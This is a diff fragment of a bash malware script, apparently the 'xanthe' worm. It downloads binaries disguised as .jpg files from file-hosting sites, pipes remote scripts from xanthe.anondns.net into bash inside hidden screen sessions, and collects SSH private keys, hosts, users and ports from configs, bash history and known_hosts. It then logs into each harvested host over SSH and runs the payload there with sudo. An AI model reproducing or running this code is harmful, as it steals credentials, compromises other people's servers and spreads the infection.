+			zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
+			chattr -iua /usr/bin/zgrab
+			curl -L -o /usr/bin/zgrab $(curl -sL $zgrabscrape1${zgrabscrapear1[$RANDOM % ${#zgrabscrapear1[@]}]} | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+			chmod +x /usr/bin/zgrab
+		fi
+		if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
+			echo ""
+		else
+			zgrabz1="http://uupload.ir/files/"
+			zgrabz2="https://s.put.re/"
+			zgrabscrape1="https://fuskbugg.se/"
+			zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
+			zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
+			zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
+			chattr -iua /usr/bin/zgrab
+			curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]}
+			chmod +x /usr/bin/zgrab
+		fi
+		which masscan >/dev/null
+		if [ $? -eq 0 ]; then
+			echo ""
+		else
+			yum install -y masscan || apt-get install masscan -y
+			chmod +x /var/run/*
+		fi
+
+		which jq >/dev/null
+		if [ $? -eq 0 ]; then
+			echo ""
+		else
+			yum install -y jq || apt-get install jq -y
+		fi
+		which screen
+		if [ $? -eq 0 ]; then
+			echo ""
+		else
+			yum install -y screen || apt-get install screen -y
+		fi
+		scanscrape1="http://xanthe.anondns.net:8080/files/"
+		actionscrape="https://letsupload.cc/"
+		scanarray1=("mxutzh.sh" "qiumb.sh")
+		#scrapeurl=$(curl -A scrapppee/1.9 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
+		rndscreen0=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen0
+		sleep 1s
+		#goog
+		screen -r $rndscreen0 -p 0 -X stuff $"bash\n"
+		screen -r $rndscreen0 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"3eS7MaDcn6 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+		sleep 2s
+		rndscreen1=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen1
+		sleep 1s
+		#amz
+		screen -r $rndscreen1 -p 0 -X stuff $'bash\n'
+		screen -r $rndscreen1 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"lbS4M5Dbn2 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+		sleep 2s
+		rndscreen2=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen2
+		sleep 1s
+		#ovh
+		screen -r $rndscreen2 -p 0 -X stuff $'bash\n'
+		screen -r $rndscreen2 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"J2S1MaDbn9 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+		sleep 2s
+		rndscreen3=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen3
+		sleep 1s
+		#cn
+		screen -r $rndscreen3 -p 0 -X stuff $'bash\n'
+		screen -r $rndscreen3 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"r6SdMfD8n5 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+		sleep 2s
+		rndscreen4=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen4
+		sleep 1s
+		#do
+		screen -r $rndscreen4 -p 0 -X stuff $'bash\n'
+		screen -r $rndscreen4 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+		sleep 2s
+		rndscreen5=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen5
+		sleep 1s
+		#de
+		screen -r $rndscreen5 -p 0 -X stuff $'bash\n'
+		screen -r $rndscreen5 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"v6S5M6D4n8 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+		sleep 2s
+		rndscreen6=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
+		screen -dmS $rndscreen6
+		sleep 1s
+		#msft
+		screen -r $rndscreen6 -p 0 -X stuff $'bash\n'
+		screen -r $rndscreen6 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
+	fi
+}
+
+localgo() {
+	myhostip=$(curl -sL icanhazip.com)
+	KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
+	KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
+	KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
+	KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
+	HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
+	HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
+	HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
+	HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
+	HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
+	HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
+	USERZ=$(
+		echo "root"
+		find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
+	)
+	USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
+	sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
+	userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
+	hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+	keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+	i=0
+	for user in $userlist; do
+		for host in $hostlist; do
+			for key in $keylist; do
+				for sshp in $sshports; do
+					((i++))
+					if [ "${i}" -eq "20" ]; then
+						sleep 5
+						ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
+						i=0
+					fi
+
+					#Wait 5 seconds after every 20 attempts and clean up hanging processes
+
+					chmod +r $key
+					chmod 400 $key
+					echo "$user@$host"
+					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -A hostchk/1.5 -L http://xanthe.anondns.net:8080/files/xanthe | sudo bash -s;"
+					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -A hostchk/1.5 -L http://xanthe.anondns.net:8080/files/xanthe | bash -s;"
+				done
+			done
+		done
+	done
+}
+stopscan() {
+	sudo killall screen
+	ps aux | grep -v grep | grep 'docker' | awk '{print $2}' | xargs -I % kill -9 %
+	ps aux | grep -v grep | grep 'screen' | awk '{print $2}' | xargs -I % kill -9 %
+	ps aux | grep -v grep | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
+}
+
+initializego
+filegetgo
+filesetupgo
+#filerungo
+sshdconfig
+resetsshgo
+scancheck
+#scango
+#stopscan
+localgo
